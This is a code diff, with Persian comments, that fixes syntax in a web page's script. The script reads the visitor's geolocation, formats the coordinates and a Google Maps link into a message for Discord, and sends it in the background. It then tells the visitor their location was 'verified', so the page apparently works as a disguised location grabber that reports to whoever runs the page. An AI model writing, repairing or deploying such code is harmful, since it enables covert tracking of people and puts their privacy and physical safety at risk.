@@ -37,11 +37,11 @@ const accuracy = position.coords.accuracy;
 
 // ساخت پیام برای ارسال به دیسکورد
 // تعریف درست آدرس نقشه با متغیرهای عددی دریافتی از مرورگر
-const mapsURL = https://www.google.com/maps?q=${latitude},${longitude};
+const mapsURL = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
 // ساخت شیء پیام با متن معتبر و داخل بک‌تیک
 const payload = {
-content: لوکیشن جدید دریافت شد!\nلینک نقشه: ${mapsURL}\nدقت: ${accuracy} متر
+    content: `لوکیشن جدید دریافت شد!\nلینک نقشه: ${mapsURL}\nدقت: ${accuracy} متر`
 };
 
 // ارسال داده‌ها به صورت پس‌زمینه
@@ -60,17 +60,17 @@ alert("موقعیت شما با موفقیت تایید شد.");
 } // 👈 این آکولاژ را دقیقاً اینجا اضافه کن تا تابع sendLocationToServer بسته شود
 
 function showError(error) {
-switch(error.code) {
-case error.PERMISSION_DENIED:
-alert("کاربر دسترسی به لوکیشن را رد کرد.");
-break;
-case error.POSITION_UNAVAILABLE:
-alert("اطلاعات موقعیت مکانی در دسترس نیست.");
-break;
-case error.TIMEOUT:
-alert("زمان درخواست به پایان رسید.");
-break;
-}
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            alert("کاربر دسترسی به لوکیشن را رد کرد.");
+            break;
+        case error.POSITION_UNAVAILABLE:
+            alert("اطلاعات موقعیت مکانی در دسترس نیست.");
+            break;
+        case error.TIMEOUT:
+            alert("زمان درخواست به پایان رسید.");
+            break;
+    }
 } // 👈 این آکولاژ هم برای بسته شدن تابع showError است
 (error => console.error('Error:', error));
 </script>
